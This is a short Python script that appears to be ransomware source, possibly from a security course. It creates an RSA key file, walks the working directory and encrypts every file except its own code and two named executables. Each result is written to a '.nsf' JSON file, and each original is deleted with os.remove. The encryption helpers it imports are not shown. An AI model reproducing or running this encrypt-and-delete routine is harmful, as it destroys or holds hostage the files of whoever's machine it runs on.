import os
import Encryption as enc
import json
import Constants
import keygen

if __name__ == '__main__':
    #Check if the PEM file currently exists 
    if os.path.isfile("./" + Constants.PEM_FILE) == False:
        #The file does not exist, make PEM file here
        keygen.generate_PEM()
    #Retrieves the path to the current location of this file
    curr_path = os.getcwd()
    #Force python to skip the python cache folder
    skip_folder = '\__pycache__'
    #Force python to remove these list of items from the root folder directory
    #Because it is our code
    for root, dirs, files in os.walk('.'):
        #The current folder that we are inspecting
        curr_folder = root.replace('.', '', 1)
        if(curr_folder == skip_folder):
            continue
        if(curr_folder == '') :
            remove_list = list(files)
            for i in remove_list:
                if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc' or i[len(i) - 4 : len(i)] == '.pem'
                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe'):
                    files.remove(i)
        for i in range(len(files)) :
            #file_to_encrypt is the absolute path to the file
            file_path = curr_path + curr_folder + "/" + files[i]
            #Generate cipher text, IV, Key, and file extension
            print(file_path)
            encoded_cipher, encoded_IV, encoded_key, ext, file, encoded_tag = enc.MyRSAEncrypt(file_path)
            #Stringify the following list
            cipher, IV, key, tag = enc.stringify([encoded_cipher, encoded_IV, encoded_key, encoded_tag])
            #Generate map
            item_map = {'c' : cipher, 'IV' : IV, 'key' : key, 'ext' : ext, 'tag' : tag}
            #Generate Json
            dump = json.dumps(item_map)
            f = open(file+ ".nsf", "w+")
            f.write(dump)
            os.remove(file_path)
